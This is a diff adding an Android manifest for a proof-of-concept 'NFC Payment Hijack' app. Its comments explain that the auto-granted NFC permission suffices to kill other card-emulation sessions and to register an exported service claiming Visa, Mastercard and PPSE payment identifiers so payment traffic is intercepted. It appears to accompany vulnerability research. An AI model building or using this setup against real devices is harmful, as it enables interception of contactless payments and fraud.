@@ -1,0 +1,60 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.poc.nfchijack">
+
+    <!--
+        NFC Payment Hijack PoC (V-451 + V-452 + V-456)
+
+        PERMISSIONS REQUIRED: Only android.permission.NFC
+        This is a NORMAL permission — auto-granted at install, no user prompt.
+
+        NO other permissions needed to:
+        - Call notifyPollingLoop() (V-451)
+        - Call notifyHceDeactivated() (V-452)
+        - Register as preferred HCE service when foreground (V-456)
+    -->
+    <uses-permission android:name="android.permission.NFC" />
+
+    <uses-feature android:name="android.hardware.nfc.hce"
+        android:required="true" />
+
+    <application
+        android:label="NFC PoC"
+        android:icon="@android:drawable/ic_dialog_alert"
+        android:theme="@android:style/Theme.Material.NoActionBar">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:label="NFC Hijack PoC">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- V-452: Background service for continuous HCE deactivation -->
+        <service
+            android:name=".NfcKillService"
+            android:exported="false" />
+
+        <!--
+            V-456: Malicious HCE service that intercepts NFC payment APDUs.
+            Declares payment AIDs (PPSE, Visa, Mastercard).
+            When set as preferred foreground service, ALL payment APDUs route here.
+        -->
+        <service
+            android:name=".HijackHceService"
+            android:exported="true"
+            android:permission="android.permission.BIND_NFC_SERVICE">
+            <intent-filter>
+                <action android:name="android.nfc.cardemulation.action.HOST_APDU_SERVICE" />
+            </intent-filter>
+            <meta-data
+                android:name="android.nfc.cardemulation.host_apdu_service"
+                android:resource="@xml/apduservice" />
+        </service>
+
+    </application>
+
+</manifest>
